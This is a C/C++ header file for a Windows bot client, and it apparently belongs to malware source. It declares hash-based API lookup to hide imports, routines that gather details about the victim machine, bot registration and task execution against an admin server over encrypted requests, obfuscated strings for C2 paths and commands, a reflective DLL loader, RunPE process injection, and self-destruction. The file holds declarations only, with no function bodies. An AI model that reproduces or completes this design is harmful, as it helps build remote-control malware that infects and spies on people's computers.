#pragma once
#include <Windows.h>
#include <stdint.h>

#define MAX_STRING 512
#define MAX_COMMANDS 15

LPVOID GetApiAddr(HMODULE hModule, UINT uHash);
LPVOID GetWinAPI(int dll, LPCSTR funcName);

#define USER32 0
#define KERNEL32 1
#define SHLWAPI 2
#define SHELL32 3
#define WININET 4
#define MSVCRT 5
#define NTDLL 6
#define OLE32 7
#define ADVAPI32 8
//#define API(DLL, FUNC) ((T_##FUNC)GetWinAPI(DLL, hash##FUNC))
#define API(DLL, FUNC) ((T_##FUNC)GetWinAPI(DLL, StaticData::##FUNC))

DWORD PostRequest(LPCWSTR host, BOOL isSsl, LPCWSTR path, LPCWSTR req, DWORD* responseSize, BYTE* response);
DWORD GetRequest(LPCWSTR host, BOOL isSsl, LPCWSTR req, DWORD* responseSize, BYTE* response);
DWORD PostRequestParts(LPCWSTR host, BOOL isSsl, LPCWSTR path, LPCWSTR req, DWORD* responseSize, BYTE* response);

void GetWorkPath(LPWSTR path);
int strCmp(const char* src, const char* dst);
char* strCat(char* dest, const char* src);
char* strCpy(char* dest, const char* src);
size_t strLen(LPCSTR str);
unsigned int CalcHash(const byte* ptr, int c_ptr);
void GetBotId(LPWSTR botId);

typedef ULONG_PTR(WINAPI* REFLECTIVELOADER)(VOID);
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

#define DLL_QUERY_HMODULE 6

BOOL ASCIIToUnicode(char* utf8, wchar_t* unicode);
BOOL UnicodeToASCII(wchar_t* utf16, char* ascii);

void GetWinVer(DWORD* pdwMajor, DWORD* pdwMinor, DWORD* pdwBuild);
void IsWinX64(DWORD* isWinX64);
void GetCpuName(LPWSTR cpuName);
void GetGpuName(LPWSTR gpuName);
void GetAviableRam(DWORD* aviableRam);
void GetScreenResolution(LPWSTR screenResolution);
BOOL GetUsernameW(LPWSTR userName);
BOOL GetComputernameW(LPWSTR computerName);
void GetActiveWindow(LPWSTR activeWindow);

void start_bot(wchar_t* botId);
uint8_t *gen_data_to_send(uint8_t* to_enc_data, uint32_t size_enc_data);
bool decrypt_recv_data(uint8_t* enc_data, uint32_t size_enc_data, uint8_t* dec_data);
bool post_send_recv_bot(wchar_t* admin_addr, wchar_t* path_to_admin, wchar_t* post_recv, BYTE* decServerResponse);
bool bot_reg(wchar_t* req);
int parse_task_and_exec(wchar_t* botId, char* DecResponse);

PBYTE ReadFileHelper(LPCWSTR lpwName, LPDWORD dwFileSize_out);

HMODULE __stdcall LoadModule(char* module);
FARPROC _stdcall GetModuleProcAddress(HMODULE hModule, char* lpProcName);
BOOL __stdcall FreeLoadedModule(HMODULE hModule);

wchar_t* hide_admin_path();
wchar_t* hide_ping_path();
wchar_t* hide_reg_path();
wchar_t* hide_download_module_path();
wchar_t* hide_error_path();

char* hide_str_run_module();
char* hide_str_self_destroy();
char* hide_str_reg();
char* hide_str_task();
char* hide_str_ping();
char* hide_str_exe();
BOOL RunPE(LPCSTR injectFilePath, void* fileBuffer);
void do_destroy();